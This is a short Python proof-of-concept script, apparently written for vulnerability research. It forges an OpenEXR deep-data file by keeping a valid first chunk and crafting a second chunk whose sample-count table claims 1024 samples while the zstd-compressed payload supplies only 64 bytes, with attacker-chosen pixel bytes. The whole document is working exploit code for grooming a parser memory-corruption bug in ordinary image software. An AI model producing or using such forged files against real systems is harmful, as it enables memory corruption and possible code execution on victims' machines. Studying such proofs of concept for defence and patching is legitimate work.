#!/usr/bin/env python3
"""W172: keep valid chunk 0, forge chunk 1 with S=1024, U=64.

Usage: make_poc_groom.py baseline.exr out.exr 0xPIXEL
The 16x2 baseline is produced by gen_groom.cpp. Pixel bytes are supplied by
argv so the two variants differ only in file content.
"""
import os
import struct
import subprocess
import sys
import tempfile

base, out, pixel_s = sys.argv[1], sys.argv[2], sys.argv[3]
pixel = int(pixel_s, 0)
S, U, W = 1024, 64, 16
data = bytearray(open(base, "rb").read())

p = 8
while data[p]:
    j = data.index(b"\x00", p)
    p = j + 1
    j = data.index(b"\x00", p)
    p = j + 1
    sz = struct.unpack_from("<I", data, p)[0]
    p += 4 + sz
p += 1
table = p
offs = list(struct.unpack_from("<QQ", data, table))
assert offs[0] == table + 16
chunk0 = bytes(data[offs[0]:offs[1]])

sampsize = W * 4
counts = [1] * (W - 1) + [S]
cum, tbl = 0, bytearray()
for c in counts:
    cum = max(cum, c)
    tbl += struct.pack("<I", cum)
assert len(tbl) == sampsize


def shuffle4(b):
    n = len(b) // 4
    o = bytearray(len(b))
    for i in range(n):
        o[i] = b[i * 4]
        o[n + i] = b[i * 4 + 1]
        o[2 * n + i] = b[i * 4 + 2]
        o[3 * n + i] = b[i * 4 + 3]
    return bytes(o)


inner = struct.pack("<Q", U) + shuffle4(bytes([pixel]) * U)
with tempfile.NamedTemporaryFile(delete=False) as tf:
    tf.write(inner)
    tmp = tf.name
payload = subprocess.run(["zstd", "-q", "-c", "-19", tmp],
                         capture_output=True, check=True).stdout
os.unlink(tmp)
MAGIC = 8248453963162350458
frame = (struct.pack("<Q", MAGIC) + struct.pack("<I", 1)
         + struct.pack("<I", 0) + struct.pack("<Q", len(payload)) + payload)
chunk1 = (struct.pack("<i", 1) + struct.pack("<qqq", sampsize, len(frame), U)
          + bytes(tbl) + frame)
new_offs = (offs[0], offs[0] + len(chunk0))
out_data = (bytes(data[:table]) + struct.pack("<QQ", *new_offs)
            + chunk0 + chunk1)
open(out, "wb").write(out_data)
print(f"chunk0={len(chunk0)} chunk1={len(chunk1)} out={len(out_data)} pixel=0x{pixel:02x}")
